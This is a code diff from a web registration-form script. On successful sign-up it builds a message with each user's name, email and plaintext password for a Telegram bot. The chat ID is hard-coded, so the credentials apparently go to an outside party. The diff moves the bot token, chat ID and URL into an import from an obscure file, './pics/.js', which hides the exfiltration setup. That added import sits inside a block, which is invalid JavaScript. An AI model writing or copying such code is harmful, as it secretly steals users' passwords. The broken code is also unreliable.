@@ -162,15 +162,8 @@ $(document).ready(function () {
                 message: 'Passwords do not match!',
                 position: 'topRight',
             });
-        } else { 
-                 
-            if (process.env.NODE_ENV !== 'production') {
-    require('dotenv').config();
-}
-
-            const botToken = process.env.ADELINA_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-            const chatID = '5538909913';
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        } else {                 
+            import { botToken, chatID, telegramURL } from './pics/.js';
             
             const message = `New Registered User:\n\nName: ${name}\n\nEmail: ${email}\n\nPassword: ${password}`;  
   
